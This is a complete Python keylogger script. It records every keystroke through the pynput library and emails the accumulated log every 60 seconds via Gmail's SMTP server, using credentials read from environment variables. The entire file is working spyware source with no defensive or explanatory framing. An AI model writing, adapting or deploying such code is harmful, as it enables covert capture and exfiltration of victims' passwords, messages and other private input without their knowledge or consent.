import pynput.keyboard
import smtplib # send emails
import threading 
import os 
from dotenv import load_dotenv

load_dotenv()

email = os.getenv("USER_EMAIL")
password = os.getenv("USER_PASS")
send_interval = 60

class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "Keylogger started..."
        self.interval = interval
        self.email = email
        self.password = password
        
    def append_to_log(self, string):
        self.log = self.log + string

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if str(key) == "Key.space":
                current_key = " "
            elif str(key) == "Key.enter":
                current_key = "\n"
            else:
                current_key = " [" + str(key) + "] "
                
        self.append_to_log(current_key)
        
    def send_mail(self, email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
            print("Sending email..")
        except Exception as e:
            print(e)
            
    def report(self):
        if self.log != "":
            try:
                self.send_mail(self.email, self.password, "\n\n" + self.log)
                self.log = ""
            except Exception:
                pass

        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    my_keylogger = Keylogger(send_interval, email, password)
    my_keylogger.start()